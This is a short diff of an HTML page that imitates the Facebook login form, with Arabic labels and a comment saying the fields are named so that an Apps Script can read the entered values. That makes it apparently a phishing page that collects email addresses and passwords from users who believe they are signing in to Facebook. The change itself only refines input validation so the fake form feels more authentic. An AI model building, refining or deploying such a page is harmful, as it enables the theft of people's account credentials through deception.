@@ -83,8 +83,8 @@ input[type="password"] {
     <div class="logo">facebook</div>
     <form id="loginForm">
       <!-- ضروري name عشان Apps Script يقرا القيم -->
-      <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-      <input type="password" name="password" placeholder="كلمة السر" required>
+      <input type="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+      <input type="password" name="password" minlength="5" placeholder="كلمة السر" required>
       <button type="submit" class="login-btn">تسجيل الدخول</button><!-- توجيه لـ YouTube عند نقر "هل نسيت الحساب؟" -->
   <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot" target="_blank">هل نسيت الحساب؟</a>
 
